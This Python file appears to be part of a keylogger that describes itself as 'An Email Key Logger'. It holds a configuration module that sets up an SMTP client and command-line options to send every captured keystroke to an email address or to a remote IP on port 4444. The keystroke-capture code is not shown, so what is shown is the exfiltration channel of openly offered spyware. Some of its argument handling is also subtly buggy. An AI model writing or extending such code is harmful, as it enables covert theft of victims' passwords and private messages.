import argparse, smtplib
from re import fullmatch
from getpass import getpass


class ConfigEmail:

    EMAIL_REGEX = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
    EMAIL_SERVICE = 'smtp.gmail.com'

    def __init__(self, address: str, password: str, destination: str, service: str) -> None:
        self.server = smtplib.SMTP_SSL(service, 465)
        self.address = address
        self.password = password
        self.destination = destination

    def emailLogin(self) -> None:
        print('Logging in to email...')
        try:
            self.server.login(self.address, self.password)
            print('Logged in successfully!')
        except smtplib.SMTPAuthenticationError:
            print('Invalid email/password or 2FA is blocking login!')
            exit(1)
        
    def sendEmail(self, message: str) -> None:
        print('Sending email...')
        try:
            self.server.sendmail(self.address, self.destination, message)
            print('Email sent successfully!')
        except smtplib.SMTPException:
            print('Couldn\'t send email!')
            exit(1)

    @classmethod
    def checkEmail(cls, email_address: str) -> bool:
        return fullmatch(cls.EMAIL_REGEX, email_address)

class Configs:

    DEFAULT_MAX_CHARS = 50
    DEFAULT_PORT = 4444
    

    def __init__(self, filename: str) -> None:
        self.email, self.ip, self.port, self.limit = None, None, None, None

        parser = argparse.ArgumentParser(prog=filename, description='An Email Key Logger, developed using Python, able to send the all pressed keys to a given email address or an IP address', add_help=True)
        subparsers = parser.add_subparsers(title='Valid Destination Addresses')
        
        # Email Send
        parser_email = subparsers.add_parser('email', help='Email Address')
        parser_email.add_argument('-f', '--from', type=str, nargs=1, required=True, help='Email Address to send from', action='store', dest='from_email')
        parser_email.add_argument('-t', '--to', type=str, nargs='?', required=False, help='Email Address to send to (default: source email address)', action='store', dest='to_email')
        parser_email.add_argument('-s', '--service', type=str, nargs='?', help=f'Email service to use (default: {ConfigEmail.EMAIL_SERVICE})', required=False, action='store', default=ConfigEmail.EMAIL_SERVICE, dest='email_service')
        parser_email.add_argument('-l', '--limit', type=str, nargs='?', help=f'Maximum number of characters to send per email (default: {self.DEFAULT_MAX_CHARS})', required=False, action='store', default=self.DEFAULT_MAX_CHARS, dest='limit')

        # IP Send
        parser_ip = subparsers.add_parser('ip', help='IP Address')
        parser_ip.add_argument('-a', '--addr', type=str, nargs=1, required=True, help=f'IP address to connect to', action='store')
        parser_ip.add_argument('-p', '--port', type=str, nargs='?', help=f'Port to connect to (default: {self.DEFAULT_PORT})', required=False, action='store', default=self.DEFAULT_PORT)
        parser_ip.add_argument('-l', '--limit', type=str, nargs='?', help=f'Maximum number of characters to send per email (default: {self.DEFAULT_MAX_CHARS})', required=False, action='store', default=self.DEFAULT_MAX_CHARS, dest='limit')

        # parser.add_argument('-k', '--keyboard', help='Considers only keyobard inputs (default: considers keyboard inputs)', required=False, action='store_true')
        # parser.add_argument('-m', '--mouse', help='Considers only mouse inputs (default: considers all inputs)', required=False, action='store_true')
        
        args = parser.parse_args()
        print(f"\nARGS: {args}")
        self.limit = args.limit if "limit" in args else self.DEFAULT_MAX_CHARS

        if hasattr(args, 'to_email'):
            from_email = args.from_email[0]
            to_email = args.to_email[0] if args.to_email else from_email
            if not ConfigEmail.checkEmail(from_email) or not ConfigEmail.checkEmail(to_email):
                parser.error('Invalid email address')
            password = getpass(f'Password for {from_email}: ')

            self.email = ConfigEmail(from_email, password, to_email, args.email_service[0])
        elif hasattr(args, 'addr'):
            self.ip = args.addr[0]
            self.port = args.port
